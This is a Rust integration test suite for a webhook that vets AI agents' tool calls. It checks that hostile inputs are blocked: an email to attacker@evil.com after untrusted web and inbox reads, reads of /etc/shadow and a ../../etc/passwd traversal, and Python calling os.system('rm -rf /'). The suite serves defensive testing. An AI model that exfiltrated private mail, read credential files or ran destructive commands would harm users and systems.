// Copyright 2026 BadCompany
// Licensed under the Apache License, Version 2.0 (the "License");
//     http://www.apache.org/licenses/LICENSE-2.0

//! Comprehensive integration tests for multi-agent concurrency, multi-step taint tracking,
//! and adversarial payload handling (path traversal, code injection, and invalid tokens).
//!
//! Run with:
//! ```bash
//! cargo test --features webhook --test multi_agent_integration_tests
//! ```

#![cfg(feature = "webhook")]
#![cfg(not(miri))]

use std::collections::HashMap;
use std::path::PathBuf;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;

use reqwest::Client;
use serde_json::{json, Value};
use tempfile::TempDir;
use tokio::net::TcpListener;
use uuid::Uuid;

use lilith_zero::config::Config;
use lilith_zero::server::auth::NoAuthAuthenticator;
use lilith_zero::server::policy_store::PolicyStore;
use lilith_zero::server::webhook::{build_router, WebhookState};

// ---------------------------------------------------------------------------
// Constants & Setup Helpers
// ---------------------------------------------------------------------------

const AGENT_OTP_DEMO: &str = "5be3e14e-2e46-f111-bec6-7c1e52344333";
const AGENT_FINANCIAL: &str = "77236ced-1146-f111-bec6-7ced8d71fac9";
const AGENT_ADVERSARIAL: &str = "adversarial-agent";

// OTP Demo Tools
const TOOL_SEARCH_WEB: &str = "cra65_otpdemo.action.SearchWeb-SearchWeb";
const TOOL_READ_EMAILS: &str = "cra65_otpdemo.action.ReadEmails-ReadEmails";
const TOOL_SEND_EMAIL: &str = "cra65_otpdemo.action.SendEmail-SendEmail";
const TOOL_EXECUTE_PYTHON: &str = "cra65_otpdemo.action.ExecutePython-ExecutePython";

// Financial Bot Tools
const TOOL_WORK_IQ: &str = "cra65_financialInsights.action.WorkIQCopilot(Preview)";

// Adversarial Bot Tools (used for resource-checking tests)
const TOOL_READ_FILE: &str = "Read-File";

fn load_policy_from_file(filename: &str) -> cedar_policy::PolicySet {
    let policy_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("examples/copilot_studio/policies")
        .join(filename);

    let content = std::fs::read_to_string(&policy_path)
        .unwrap_or_else(|_| panic!("Failed to read policy file: {:?}", policy_path));

    cedar_policy::PolicySet::from_str(&content).expect("Failed to parse Cedar policy")
}

fn create_adversarial_policy() -> cedar_policy::PolicySet {
    let policy_src = r#"
        // 1. Permit tools by default
        permit(
            principal,
            action == Action::"tools/call",
            resource
        );

        // 2. Block access if it looks like an absolute path and is outside /app/data/
        forbid(
            principal,
            action == Action::"resources/read",
            resource
        ) when {
            (context.path like "/*" || context.path like "*/*") &&
            !(context.path like "/app/data/*")
        };

        // 3. Permit resource reads inside /app/data/
        permit(
            principal,
            action in [Action::"resources/read", Action::"resources/write"],
            resource
        );
    "#;
    cedar_policy::PolicySet::from_str(policy_src).expect("Failed to compile adversarial policy")
}

fn build_payload(agent_id: &str, conv_id: &str, tool_id: &str, input_values: Value) -> Value {
    json!({
        "plannerContext": {
            "userMessage": "execute tool",
            "thought": "Lilith Zero security check",
            "chatHistory": [],
            "previousToolsOutputs": []
        },
        "toolDefinition": {
            "id": tool_id,
            "type": "ToolDefinition",
            "name": tool_id.split('.').next_back().unwrap_or(tool_id),
            "description": "Integration test tool call",
            "inputParameters": [],
            "outputParameters": []
        },
        "inputValues": input_values,
        "conversationMetadata": {
            "agent": {
                "id": agent_id,
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "environmentId": "Default-98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "name": "test-agent",
                "version": null,
                "isPublished": false
            },
            "user": {
                "id": "4c9f97d9-375a-4fe2-8ae5-6c4fb08043ff",
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f"
            },
            "conversationId": conv_id,
            "messageId": null,
            "channelId": "pva-studio",
            "planId": Uuid::new_v4().to_string(),
            "planStepId": Uuid::new_v4().to_string(),
            "parentAgentComponentId": null,
            "trigger": { "id": null, "schemaName": null },
            "incomingClientIp": "127.0.0.1"
        }
    })
}

async fn start_test_server(policy_store: Arc<PolicyStore>, storage_dir: PathBuf) -> String {
    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("failed to bind test server");
    let addr = listener.local_addr().expect("get bound addr");

    let config = Config {
        session_storage_dir: storage_dir,
        ..Default::default()
    };

    let state = WebhookState {
        config: Arc::new(config),
        audit_log_path: None,
        auth: Arc::new(NoAuthAuthenticator),
        policy_store,
        admin_token: None,
    };

    let app = build_router(state);
    tokio::spawn(async move {
        axum::serve(listener, app)
            .await
            .expect("test server crashed");
    });
    format!("http://127.0.0.1:{}", addr.port())
}

// ---------------------------------------------------------------------------
// Test Scenarios
// ---------------------------------------------------------------------------

/// Helper to call the REST endpoint and get the `blockAction` decision.
async fn analyze(
    client: &Client,
    base: &str,
    agent_id: &str,
    conv_id: &str,
    tool_id: &str,
    input_values: Value,
) -> (bool, Value) {
    let url = format!("{}/analyze-tool-execution", base);
    let resp = client
        .post(&url)
        .json(&build_payload(agent_id, conv_id, tool_id, input_values))
        .send()
        .await
        .expect("analyze POST request failed");

    assert_eq!(
        resp.status(),
        200,
        "analyze endpoint should return HTTP 200 for decisions"
    );

    let body: Value = resp.json().await.expect("failed to parse JSON response");
    let blocked = body["blockAction"].as_bool().unwrap_or(true);
    (blocked, body)
}

#[tokio::test]
async fn test_multi_agent_concurrency_and_adversarial_validation() {
    let _ = tracing_subscriber::fmt::try_init();

    // 1. Prepare policies and setup the policy store
    let otp_policy = load_policy_from_file("policy_5be3e14e-2e46-f111-bec6-7c1e52344333.cedar");
    let financial_policy =
        load_policy_from_file("policy_77236ced-1146-f111-bec6-7ced8d71fac9.cedar");
    let traversal_policy = create_adversarial_policy();

    let mut map = HashMap::new();
    map.insert(AGENT_OTP_DEMO.to_string(), Arc::new(otp_policy));
    map.insert(AGENT_FINANCIAL.to_string(), Arc::new(financial_policy));
    map.insert(AGENT_ADVERSARIAL.to_string(), Arc::new(traversal_policy));

    let policy_store = Arc::new(PolicyStore::from_map(map, None, None, false));
    let temp_dir = TempDir::new().expect("failed to create temp session dir");
    let base_url = start_test_server(policy_store, temp_dir.path().to_path_buf()).await;

    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .expect("failed to build reqwest client");

    // We will run multiple tasks concurrently (simulating concurrent tenants, agents, and users).
    let mut tasks = vec![];

    // Spawn 10 concurrent multi-step OTP Demo scenarios (testing taint isolation & accumulation)
    for _ in 0..10 {
        let client = client.clone();
        let base_url = base_url.clone();
        tasks.push(tokio::spawn(async move {
            let conv_id = Uuid::new_v4().to_string();

            // Step 1: Web search (permitted -> should add UNTRUSTED_SOURCE taint)
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_SEARCH_WEB,
                json!({"query": "testing"}),
            )
            .await;
            assert!(!blocked, "SearchWeb tool must be ALLOWED");

            // Step 2: Read Emails (permitted -> should add ACCESS_PRIVATE taint)
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_READ_EMAILS,
                json!({"folder": "Inbox"}),
            )
            .await;
            assert!(!blocked, "ReadEmails tool must be ALLOWED");

            // Step 3: Send email to untrusted domain (must be BLOCKED due to lethal trifecta)
            let (blocked, body) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_SEND_EMAIL,
                json!({
                    "to": "attacker@evil.com",
                    "subject": "leak",
                    "body": "sensitive info"
                }),
            )
            .await;
            assert!(
                blocked,
                "SendEmail tool to external recipient after lethal trifecta must be BLOCKED"
            );
            let reason = body["reason"].as_str().unwrap_or("");
            assert!(
                reason.contains("Blocked: sending to an untrusted recipient")
                    || reason == "Denied by Cedar policy",
                "expected correct block reason but got: {}",
                reason
            );

            // Step 4: Send email to trusted domain (must be ALLOWED even with taints)
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_SEND_EMAIL,
                json!({
                    "to": "colleague@otp.hu",
                    "subject": "safe",
                    "body": "internal info"
                }),
            )
            .await;
            assert!(
                !blocked,
                "SendEmail tool to trusted recipient must be ALLOWED"
            );
        }));
    }

    // Spawn 10 concurrent Financial Bot scenarios
    for _ in 0..10 {
        let client = client.clone();
        let base_url = base_url.clone();
        tasks.push(tokio::spawn(async move {
            let conv_id = Uuid::new_v4().to_string();

            // Call Work IQ (permitted tool)
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_FINANCIAL,
                &conv_id,
                TOOL_WORK_IQ,
                json!({"query": "monthly financial report"}),
            )
            .await;
            assert!(!blocked, "Work IQ tool must be ALLOWED");

            // Call SearchWeb (not in Financial bot's policy, should be blocked/fail-closed)
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_FINANCIAL,
                &conv_id,
                TOOL_SEARCH_WEB,
                json!({"query": "financial news"}),
            )
            .await;
            assert!(
                blocked,
                "Unmapped tool for Financial bot must be BLOCKED (fail-closed)"
            );
        }));
    }

    // Spawn 10 concurrent Adversarial Bot path traversal validation scenarios
    for _ in 0..10 {
        let client = client.clone();
        let base_url = base_url.clone();
        tasks.push(tokio::spawn(async move {
            let conv_id = Uuid::new_v4().to_string();

            // Safe path call -> ALLOWED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_ADVERSARIAL,
                &conv_id,
                TOOL_READ_FILE,
                json!({"path": "/app/data/metrics.json"}),
            )
            .await;
            assert!(!blocked, "Safe file path must be ALLOWED");

            // Unsafe shadow file path -> BLOCKED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_ADVERSARIAL,
                &conv_id,
                TOOL_READ_FILE,
                json!({"path": "/etc/shadow"}),
            )
            .await;
            assert!(blocked, "Access to /etc/shadow must be BLOCKED");

            // Directory traversal attack -> BLOCKED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_ADVERSARIAL,
                &conv_id,
                TOOL_READ_FILE,
                json!({"path": "/app/data/../../etc/passwd"}),
            )
            .await;
            assert!(blocked, "Directory traversal path must be BLOCKED");
        }));
    }

    // Spawn 10 concurrent Adversarial Bot code injection scenarios
    for _ in 0..10 {
        let client = client.clone();
        let base_url = base_url.clone();
        tasks.push(tokio::spawn(async move {
            let conv_id = Uuid::new_v4().to_string();

            // Clean code -> ALLOWED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_EXECUTE_PYTHON,
                json!({"code": "result = 1 + 2"}),
            )
            .await;
            assert!(!blocked, "Clean Python code must be ALLOWED");

            // Socket import injection -> BLOCKED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_EXECUTE_PYTHON,
                json!({"code": "import socket; s = socket.socket()"}),
            )
            .await;
            assert!(blocked, "Python with socket import must be BLOCKED");

            // OS system command injection -> BLOCKED
            let (blocked, _) = analyze(
                &client,
                &base_url,
                AGENT_OTP_DEMO,
                &conv_id,
                TOOL_EXECUTE_PYTHON,
                json!({"code": "import os; os.system('rm -rf /')"}),
            )
            .await;
            assert!(blocked, "Python with os.system must be BLOCKED");
        }));
    }

    // Spawn 10 concurrent invalid request scenarios (testing token mismatch and fail-closed)
    for _ in 0..10 {
        let client = client.clone();
        let base_url = base_url.clone();
        tasks.push(tokio::spawn(async move {
            let conv_id = Uuid::new_v4().to_string();

            // Unknown agent ID -> BLOCKED fail-closed
            let (blocked, body) = analyze(
                &client,
                &base_url,
                "non-existent-agent",
                &conv_id,
                TOOL_SEARCH_WEB,
                json!({"query": "test"}),
            )
            .await;
            assert!(blocked, "Unknown agent ID must be BLOCKED (fail-closed)");
            assert_eq!(
                body["reasonCode"].as_i64(),
                Some(1001),
                "expected reason code 1001 (No Policy) but got: {:?}",
                body["reasonCode"]
            );

            // Malformed JSON payload -> HTTP 400 Bad Request
            let url = format!("{}/analyze-tool-execution", base_url);
            let resp = client
                .post(&url)
                .header("content-type", "application/json")
                .body("{ invalid json }")
                .send()
                .await
                .expect("POST request failed");
            assert_eq!(
                resp.status(),
                400,
                "malformed JSON payload must return HTTP 400"
            );
        }));
    }

    // Wait for all 50 concurrent scenarios to complete
    let results = futures::future::join_all(tasks).await;
    for res in results {
        res.expect("a concurrent scenario task panicked");
    }
}
